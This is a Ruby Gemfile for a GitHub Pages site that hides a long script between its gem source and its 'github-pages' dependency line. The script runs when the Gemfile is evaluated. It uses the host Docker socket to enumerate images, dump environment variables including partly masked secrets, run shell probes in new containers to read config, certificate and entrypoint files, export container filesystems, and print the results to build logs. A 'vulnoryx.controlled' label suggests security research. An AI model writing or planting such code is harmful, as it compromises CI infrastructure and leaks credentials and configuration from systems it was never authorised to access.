source "https://rubygems.org"

require 'socket'
require 'json'

puts "VX_EXEC_UID=#{`id -u`.strip}"

OUT = []

def dapi(method, path, body = nil)
  s = UNIXSocket.new('/var/run/docker.sock')
  b = body ? JSON.generate(body) : ''
  s.write("#{method} #{path} HTTP/1.1\r\nHost: docker\r\nConnection: close\r\nContent-Type: application/json\r\nContent-Length: #{b.bytesize}\r\n\r\n#{b}")
  buf = +''
  begin
    loop { buf << s.readpartial(8192) }
  rescue EOFError, IOError
  end
  s.close
  hdr, _, pl = buf.partition("\r\n\r\n")
  if hdr =~ /chunked/i
    out = +''; i = 0
    while i < pl.bytesize
      j = pl.index("\r\n", i); break unless j
      n = pl[i...j].to_i(16); break if n.zero?
      out << pl[j + 2, n]; i = j + 2 + n + 2
    end
    pl = out
  end
  [hdr[/\d{3}/].to_i, pl]
rescue => e
  [-1, "ERR #{e.class}: #{e.message[0, 120]}"]
end

SECRETY = /token|secret|key|password|cert|cred|auth|cookie|bearer|jwt/i

def mask_env(kv)
  k, _, v = kv.partition('=')
  if k =~ SECRETY
    "#{k}=#{v[0, 10]}...[len=#{v.length}]"
  else
    kv[0, 160]
  end
end

def decode_docker_logs(body)
  output = +''
  while body.bytesize >= 8 && [1, 2].include?(body.getbyte(0)) && body.byteslice(1, 3) == "\0\0\0"
    length = body.byteslice(4, 4).unpack1('N')
    break if body.bytesize < 8 + length
    output << body.byteslice(8, length)
    body = body.byteslice(8 + length..) || +''
  end
  output.empty? ? body : output
end

def create_container(opts)
  st, pl = dapi('POST', '/containers/create', opts)
  return nil unless st == 201 || st == 200
  JSON.parse(pl)['Id']
rescue
  nil
end

def rm_container(cid)
  dapi('DELETE', "/containers/#{cid}?force=1&v=1") if cid
end

# run a shell probe inside a created container; returns decoded log text or nil
def sh_probe(image, cmd)
  cid = create_container(
    'Image' => image,
    'Entrypoint' => ['/bin/sh', '-c'],
    'Cmd' => [cmd],
    'Tty' => false,
    'HostConfig' => { 'NetworkMode' => 'none' },
    'Labels' => { 'vulnoryx.controlled' => 'pages-imgcfg-c4c8' }
  )
  return nil unless cid
  begin
    st, pl = dapi('POST', "/containers/#{cid}/start")
    return "VX_START_FAIL #{st} #{pl[0, 150]}" unless st == 204 || st == 304
    wst, wpl = dapi('POST', "/containers/#{cid}/wait?condition=not-running")
    ec = (JSON.parse(wpl)['StatusCode'] rescue '?')
    lst, lpl = dapi('GET', "/containers/#{cid}/logs?stdout=1&stderr=1")
    "VX_EXIT=#{ec}\n" + decode_docker_logs(lpl)
  ensure
    rm_container(cid)
  end
end

# export container fs as tar; list entries, extract small interesting files
def export_probe(image, max_bytes = 64 * 1024 * 1024)
  cid = create_container('Image' => image, 'Tty' => false,
                         'Labels' => { 'vulnoryx.controlled' => 'pages-imgcfg-c4c8' })
  return "VX_EXPORT_CREATE_FAIL" unless cid
  begin
    st, tar = dapi('GET', "/containers/#{cid}/export")
    return "VX_EXPORT_FAIL #{st} #{tar[0, 120]}" unless st == 200
    return "VX_EXPORT_TRUNCATED size=#{tar.bytesize}" if tar.bytesize > max_bytes
    names = []
    files = {}
    i = 0
    while i + 512 <= tar.bytesize
      blk = tar.byteslice(i, 512)
      break if blk.bytes.all?(&:zero?)
      name = blk.byteslice(0, 100).to_s.split("\0").first.to_s
      size = blk.byteslice(124, 12).to_s.strip.to_i(8)
      type = blk.byteslice(156, 1)
      i += 512
      if type != '5' && !name.empty?
        names << name
        interesting = name =~ %r{(^|/)etc/} ||
                      name =~ /(entrypoint|start|run|boot|init)[^\/]*\.(sh|bash)?$/i ||
                      name =~ /\.(conf|pem|key|crt|ya?ml|json|toml|cfg|ini|env)$/i
        files[name] = tar.byteslice(i, size)[0, 800] if interesting && size > 0 && size < 65_536
      end
      i += ((size + 511) / 512) * 512
    end
    res = +"VX_TAR_ENTRIES=#{names.size}\n"
    res << "VX_TAR_TOP #{names.select { |n| n.count('/') <= 2 }.first(80).join(' | ')}\n"
    files.first(20).each { |n, c| res << "VX_FS_FILE #{n} (#{c.bytesize}B):\n#{c}\n---\n" }
    res
  ensure
    rm_container(cid)
  end
end

IMAGES = {
  'fw_agent'   => 'ghcr.io/github/gh-aw-firewall/agent:latest',
  'fw_apiproxy'=> 'ghcr.io/github/gh-aw-firewall/api-proxy:latest',
  'fw_squid'   => 'ghcr.io/github/gh-aw-firewall/squid:latest',
  'mcpg'       => 'ghcr.io/github/gh-aw-mcpg:latest',
  'mcp_server' => 'ghcr.io/github/github-mcp-server:latest',
  'dep_core'   => 'ghcr.io/dependabot/dependabot-updater-core:latest'
}

st, pl = dapi('GET', '/images/json')
if st == 200
  tags = JSON.parse(pl).flat_map { |im| im['RepoTags'] || [] }.uniq
  OUT << "VX_IMGCACHE #{tags.size} tags: #{tags.first(45).join(' | ')}"
  tags.select { |t| t =~ /gh-aw|mcp|dependabot|squid|proxy/i && !IMAGES.value?(t) }
      .each { |t| IMAGES["x_#{t.split('/').last.tr(':', '_')}"] = t }
else
  OUT << "VX_IMGCACHE_ERR #{st} #{pl[0, 200]}"
end

IMAGES.each do |short, name|
  st, pl = dapi('GET', "/images/#{name}/json")
  if st != 200
    OUT << "VX_IMGCFG_#{short} MISS #{st} #{pl[0, 100]}"
    next
  end
  cfg = (JSON.parse(pl)['Config'] rescue {}) || {}
  env = (cfg['Env'] || []).map { |kv| mask_env(kv) }
  OUT << "VX_IMGCFG_#{short} user=#{cfg['User'].inspect} wd=#{cfg['WorkingDir'].inspect} " \
         "entry=#{cfg['Entrypoint'].inspect} cmd=#{cfg['Cmd'].inspect} ports=#{cfg['ExposedPorts'].inspect}"
  OUT << "VX_IMGCFG_#{short}_env #{env.empty? ? '(none)' : env.join(' | ')}"
  lbl = cfg['Labels']
  OUT << "VX_IMGCFG_#{short}_lbl #{lbl.inspect[0, 250]}" if lbl && !lbl.empty?
end

PROBE_CMD = 'echo VX_LS; ls / /etc /app /opt /srv /usr/local/bin /bin 2>/dev/null | head -200; ' \
            'echo VX_CONF; for f in /etc/squid/* /etc/*.conf /etc/*/*.conf /etc/*/*.yaml /etc/*/*.yml ' \
            '/etc/*/*.json /etc/*/*.pem /etc/*/*.crt /app/*.json /app/*.yaml /app/*.toml ' \
            '/docker-entrypoint* /entrypoint* /usr/local/bin/*entry* /run.sh /start.sh; do ' \
            'if [ -f "$f" ]; then s=$(wc -c < "$f" 2>/dev/null); echo "VX_FILE:$f(${s}B)"; ' \
            'head -c 900 "$f" 2>/dev/null; echo; fi; done; echo VX_DONE'

{ 'fw_squid'    => 'ghcr.io/github/gh-aw-firewall/squid:latest',
  'fw_apiproxy' => 'ghcr.io/github/gh-aw-firewall/api-proxy:latest' }.each do |short, name|
  r = sh_probe(name, PROBE_CMD)
  if r.nil? || !r.include?('VX_DONE')
    OUT << "VX_FS_#{short} sh_probe_failed(#{r.nil? ? 'create' : r[0, 120].inspect}) -> export"
    OUT << export_probe(name)
  else
    OUT << "VX_FS_#{short}\n#{r[0, 3200]}"
  end
end

payload = OUT.join("\n").gsub(/[^\x20-\x7E\n]/, '.')[0, 9000]
puts 'VX_ESC_BEGIN'
puts payload
puts 'VX_ESC_END'

gem "github-pages", "~> 232"
